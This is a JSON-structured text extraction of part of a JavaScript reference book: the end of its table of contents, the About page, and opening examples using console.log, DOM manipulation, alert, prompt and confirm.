        "text": "Section 93.1: Fluent API capturing construction of HTML articles with JS   415",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 94: Web Cryptography API   417",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ............................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 94.1: Creating digests (e.g. SHA-256)   417",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ......................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 94.2: Cryptographically random data   417",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ....................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 94.3: Generating RSA key pair and converting to PEM format   418",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .............................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 94.4: Converting PEM key pair to CryptoKey   419",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 95: Security issues   421",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ................................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 95.1: Re\ufb02ected Cross-site scripting (XSS)   421",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 95.2: Persistent Cross-site scripting (XSS)   422",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 95.3: Persistent Cross-site scripting from JavaScript string literals  ",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ....................................................... 423",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 95.4: Why scripts from other people can harm your website and its visitors   423",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ...................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 95.5: Evaled JSON injection   424",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 96: Same Origin Policy & Cross-Origin Communication   426",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ..................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 96.1: Safe cross-origin communication with messages   426",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 96.2: Ways to circumvent Same-Origin Policy   427",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ......................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 97: Error Handling   429",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ................................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 97.1: Error objects   429",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 97.2: Interaction with Promises   429",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 97.3: Error types   430",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 97.4: Order of operations plus advanced thoughts   430",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 98: Global error handling in browsers   433",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ........................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 98.1: Handling window.onerror to report all errors back to the server-side   433",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ......................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 99: Debugging   435",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " .......................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 99.1: Interactive interpreter variables   435",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 99.2: Breakpoints   435",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ......................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 99.3: Using setters and getters to \ufb01nd what changed a property   436",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ......................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 99.4: Using the console   437",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 99.5: Automatically pausing execution   438",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ..................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 99.6: Elements inspector   438",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 99.7: Break when a function is called   438",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 99.8: Stepping through code   439",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ...................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 100: Unit Testing JavaScript   440",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ............................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 100.1: Unit Testing Promises with Mocha, Sinon, Chai and Proxyquire   440",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 100.2: Basic Assertion   442",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 101: Evaluating JavaScript   444",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 101.1: Evaluate a string of JavaScript statements   444",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 101.2: Introduction   444",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 101.3: Evaluation and Math   444",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .......................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 102: Linters - Ensuring code quality   445",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ............................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 102.1: JSHint   445",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 102.2: ESLint / JSCS   446",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ..................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 102.3: JSLint   446",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 103: Anti-patterns   447",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " .................................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 103.1: Chaining assignments in var declarations   447",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ...................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 104: Performance Tips   448",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ........................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 104.1: Avoid try/catch in performance-critical functions   448",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ......................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 104.2: Limit DOM Updates   448",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 104.3: Benchmarking your code - measuring execution time   449",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 104.4: Use a memoizer for heavy-computing functions   451",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ......................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 104.5: Initializing object properties with null   453",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .............................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 104.6: Reuse objects rather than recreate   454",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 104.7: Prefer local variables to globals, attributes, and indexed values   455",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 104.8: Be consistent in use of Numbers   456",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ..................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 105: Memory e\ue024ciency   458",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ....................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 105.1: Drawback of creating true private method   458",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Appendix A: Reserved Keywords   459",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ...................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section A.1: Reserved Keywords   459",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .............................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section A.2: Identi\ufb01ers & Identi\ufb01er Names  ",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................. 461",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Credits   463",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ............................................................................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "You may also like  ",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ...................................................................................................................................................... 474",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 1",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "About",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Please feel free to share this PDF with anyone for free, latest version of this book can be downloaded from: https://goalkicker.com/JavaScriptBook",
        "font_name": "OpenSans",
        "font_size": 11,
        "img": []
    },
    {
        "text": "This  JavaScript\u00ae Notes for Professionals  book is compiled from  Stack Over\ufb02ow Documentation , the content is written by the beautiful people at Stack Over\ufb02ow. Text content is released under Creative Commons BY-SA, see credits at the end of this book whom contributed to the various chapters. Images may be copyright of their respective owners unless otherwise speci\ufb01ed This is an uno\ufb03cial free book created for educational purposes and is not a\ufb03liated with o\ufb03cial JavaScript\u00ae group(s) or company(s) nor Stack Over\ufb02ow. All trademarks and registered trademarks are the property of their respective company owners The information presented in this book is not guaranteed to be correct nor accurate, use at your own risk Please send feedback and corrections to  web@petercv.com",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 2",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 1: Getting started with JavaScript",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Version Release Date 1",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "1997-06-01 2 1998-06-01 3 1998-12-01 E4X 2004-06-01 5 2009-12-01 5.1 2011-06-01 6 2015-06-01 7 2016-06-14 8 2017-06-27",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 1.1: Using console.log()",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Introduction",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "All modern web browsers, Node.js as well as almost every other JavaScript environments support writing messages to a console using a suite of logging methods. The most common of these methods is  console. log () . In a browser environment, the  console. log ()  function is predominantly used for debugging purposes.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Getting Started",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Open up the JavaScript Console in your browser, type the following, and press   Enter  :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( \"Hello, World!\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This will log the following to the console: In the example above, the  console. log ()  function prints  Hello ,  World !  to the console and returns  undefined (shown above in the console output window). This is because  console. log ()  has no explicit  return value .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": [
            "output_directory\\image_18_1.png"
        ]
    },
    {
        "text": "Logging variables",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ()  can be used to log variables of any kind; not only strings. Just pass in the variable that you want to be displayed in the console, for example:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  foo  =   \"bar\" ; console. log ( foo );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This will log the following to the console:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 3",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "If you want to log two or more values, simply separate them with commas. Spaces will be automatically added between each argument during concatenation:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": [
            "output_directory\\image_19_1.png"
        ]
    },
    {
        "text": "var  thisVar  =   'first value' ; var  thatVar  =   'second value' ; console. log ( \"thisVar:\" ,  thisVar ,   \"and thatVar:\" ,  thatVar );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This will log the following to the console:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Placeholders",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": [
            "output_directory\\image_19_2.png"
        ]
    },
    {
        "text": "You can use  console. log ()  in combination with placeholders:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  greet  =   \"Hello\" ,  who  =   \"World\" ; console. log ( \"%s, %s!\" ,  greet ,  who );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This will log the following to the console:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Logging Objects",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": [
            "output_directory\\image_19_3.png"
        ]
    },
    {
        "text": "Below we see the result of logging an object. This is often useful for logging JSON responses from API calls.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ({      'Email' :   '' ,      'Groups' :   {},      'Id' :   33 ,      'IsHiddenInUI' :   false ,      'IsSiteAdmin' :   false ,      'LoginName' :   'i:0#.w|virtualdomain \\\\ user2' ,      'PrincipalType' :   1 ,",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 4",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "     'Title' :   'user2' });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This will log the following to the console:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Logging HTML elements",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": [
            "output_directory\\image_20_1.png"
        ]
    },
    {
        "text": "You have the ability to log any element which exists within the  DOM . In this case we log the body element:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( document. body );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This will log the following to the console:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "End Note",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": [
            "output_directory\\image_20_2.png"
        ]
    },
    {
        "text": "For more information on the capabilities of the console, see the Console topic.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 1.2: Using the DOM API",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "DOM stands for  D ocument  O bject  M odel. It is an object-oriented representation of structured documents like XML and HTML. Setting the  textContent  property of an  Element  is one way to output text on a web page. For example, consider the following HTML tag:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "<p   id = \"paragraph\" ></p>",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "To change its  textContent  property, we can run the following JavaScript:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 5",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "document. getElementById ( \"paragraph\" ) . textContent   =   \"Hello, World\" ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This will select the element that with the id  paragraph  and set its text content to \"Hello, World\":",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "<p   id = \"paragraph\" > Hello, World </p>",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "(See also this demo) You can also use JavaScript to create a new HTML element programmatically. For example, consider an HTML document with the following body:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "<body>",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    <h1> Adding an element </h1>",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "</body>",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In our JavaScript, we create a new  <p>  tag with a  textContent  property of and add it at the end of the html body:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  element  =  document. createElement ( 'p' ); element. textContent   =   \"Hello, World\" ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "document. body . appendChild ( element );   //add the newly created element to the DOM",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "That will change your HTML body to the following:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "<body>",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    <h1> Adding an element </h1>     <p> Hello, World </p>",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "</body>",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Note that in order to manipulate elements in the DOM using JavaScript, the JavaScript code must be run  after  the relevant element has been created in the document. This can be achieved by putting the JavaScript  <script>  tags after  all of your other  <body>  content. Alternatively, you can also use  an event listener  to listen to eg.  window 's onload  event , adding your code to that event listener will delay running your code until after the whole content on your page has been loaded. A third way to make sure all your DOM has been loaded, is  to wrap the DOM manipulation code with a timeout function of 0 ms . This way, this JavaScript code is re-queued at the end of the execution queue, which gives the browser a chance to \ufb01nish doing some non-JavaScript things that have been waiting to \ufb01nish before attending to this new piece of JavaScript.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 1.3: Using window.alert()",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The  alert  method displays a visual alert box on screen. The alert method parameter is displayed to the user in plain  text:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "window. alert ( message );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Because  window  is the global object, you can call also use the following shorthand:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "alert ( message );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "So what does  window. alert ()  do? Well, let's take the following example:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "alert ( 'hello, world' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 6",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "In Chrome, that would produce a pop-up like this:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Notes",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": [
            "output_directory\\image_22_1.png"
        ]
    },
    {
        "text": "The  alert  method is technically a property of  window  object, but since all  window  properties are automatically global variables, we can use  alert  as a global variable instead of as a property of  window  - meaning you can directly use  alert ()  instead of  window. alert () . Unlike using  console. log ,  alert  acts as a modal prompt meaning that the code calling  alert  will pause until the prompt is answered. Traditionally this means that  no other JavaScript code will execute  until the alert is dismissed:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "alert ( 'Pause!' ); console. log ( 'Alert was dismissed' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "However the speci\ufb01cation actually allows other event-triggered code to continue to execute even though a modal dialog is still being shown. In such implementations, it is possible for other code to run while the modal dialog is being shown. More information about usage of the  alert  method can be found in the modals prompts topic. The use of alerts is usually discouraged in favour of other methods that do not block users from interacting with the page - in order to create a better user experience. Nevertheless, it can be useful for debugging. Starting with Chrome 46.0,  window. alert ()  is blocked inside an  <iframe>   unless its sandbox attribute has the value allow-modal .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 1.4: Using window.prompt()",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "An easy way to get an input from a user is by using the  prompt ()  method.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Syntax",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "prompt ( text ,   [ default ]);",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "text : The text displayed in the prompt box. default : A default value for the input \ufb01eld (optional).",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Examples",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  age  =  prompt ( \"How old are you?\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( age );   // Prints the value inserted by the user",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 7",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "If the user clicks the   OK   button, the input value is returned. Otherwise, the method returns  null . The return value of  prompt  is always a string, unless the user clicks   Cancel  , in which that case it returns  null . Safari is an exception in that when the user clicks Cancel, the function returns an empty string. From there, you can convert the return value to another type, such as an integer.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": [
            "output_directory\\image_23_1.png"
        ]
    },
    {
        "text": "Notes",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "While the prompt box is displayed, the user is prevented from accessing other parts of the page, since dialog boxes are modal windows. Starting with Chrome 46.0 this method is blocked inside an  <iframe>  unless its sandbox attribute has the value allow-modal.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 1.5: Using window.con\ufb01rm()",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The  window. confirm ()  method displays a modal dialog with an optional message and two buttons, OK and Cancel. Now, let's take the following example:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "result  =  window. confirm ( message );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Here,  message  is the optional string to be displayed in the dialog and  result  is a boolean value indicating whether OK or Cancel was selected (true means OK). window. confirm ()  is typically used to ask for user con\ufb01rmation before doing a dangerous operation like deleting something in a Control Panel:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "if ( window. confirm ( \"Are you sure you want to delete this?\" ))   {     deleteItem ( itemId ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The output of that code would look like this in the browser: If you need it for later use, you can simply store the result of the user's interaction in a variable:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": [
            "output_directory\\image_23_2.png"
        ]
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 8",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  deleteConfirm  =  window. confirm ( \"Are you sure you want to delete this?\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Notes",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
